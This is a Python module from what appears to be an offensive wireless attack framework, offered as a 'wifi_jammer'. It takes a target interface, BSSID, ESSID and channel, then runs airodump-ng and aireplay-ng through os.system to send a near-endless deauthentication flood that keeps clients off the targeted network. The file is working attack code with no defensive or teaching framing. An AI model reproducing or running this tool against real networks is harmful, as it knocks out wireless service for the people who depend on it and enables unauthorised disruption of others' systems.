import time,os
from waf.libs.color  import *
from waf.libs import variable as var

info = {
        "name"        : "wifi_jammer",
        "title"       : "Wifi jammer",
        "module"      : "wireless/wifi/attack wifi jammer network  network_manager",
        "description" : "create traffic jams for the radio transmitter so that real traffic cannot get through"
}

options ={
  "INTERFACE" : [str(var.all_var['interface']),'enter the interface [wlan0/wlan0mon]'],
  "BSSID"     : [str(var.all_var['bssid']),'enter the bssid of the target'],
  "essid"     : [str(var.all_var['essid']),'enter the essid of the target'],
  "CHANNEL"   : [str(var.all_var['channel']),'enter the channel of the network']

}

def running():
        try:
                print ("")
                print (blue+"[*]"+default+ "Starting a Attack Has Been Started on {}".format(var.all_var['essid']))
                time.sleep(2)
                print ("")
                time.sleep(2)
                print ("") 
                order = "xterm -e airodump-ng -c {} --bssid {} {} & xterm -e aireplay-ng --deauth 9999999999999 -o 1 -a {} -e {} {} ".format(var.all_var['channel'],var.all_var['bssid'],var.all_var['interface'],var.all_var['bssid'],var.all_var['essid'],var.all_var['interface'])
                geny = os.system(order)
                time.sleep(5)
                print("\n")
                print (green_underline+"[*] Done"+default)
                time.sleep(2)
                print ("")
        except Exception as e:
                print(red+"\n[-]"+default+"Error : "+str(e))